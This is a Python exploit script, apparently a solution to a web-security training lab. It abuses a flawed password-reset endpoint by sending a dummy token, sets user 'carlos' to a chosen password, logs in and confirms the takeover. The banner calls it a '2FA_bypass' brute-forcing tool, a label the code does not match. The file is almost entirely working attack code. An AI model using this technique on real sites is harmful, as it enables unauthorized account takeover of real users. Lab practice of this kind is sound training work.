import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
   
    return parser.parse_args()

def banner():
    # getting rand font
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # getting rand colore
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format('2FA_bypass',font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))


def post(s,url,path,data):
    try:
        r=s.post(url=url+path, data=data, verify=False, proxies=proxies,timeout=2)
        return r
    except Exception as e:
        print(colored(e,'red'))
        sys.exit()

def exploit(s, url):

    # Reset Carlos's password
    print(colored("(+) Resetting Carlos's password...",'blue'))
    path = "/forgot-password?temp-forgot-password-token=x"
    data = {"temp-forgot-password-token": "x",
             "username": "carlos", 
             "new-password-1": "password", 
             "new-password-2": "password"}
    
    post(s,url,path=path,data=data)

    # Access Carlos's account
    print(colored("(+) Logging into Carlos's account...",'blue'))
    path =  "/login"
    data = {"username": "carlos", "password": "password"}
    r = post(s,url=url,path=path,data=data)
    return r

    

        

def main():
    banner()
    url=parsearg().url
    url=str(url).rstrip('/')

    s = requests.Session()
    r=exploit(s, url)

    # Confirm exploit worked
    l=lambda x :True if 'Your username is: carlos' in x.text else False
    resulte=l(r)
    if resulte:
        print(colored("(+) Successfully logged into Carlos's account.",'green'))
    else:
        print(colored("(-) Exploit failed.",'red'))
        sys.exit(-1)

if __name__ == "__main__":
    main()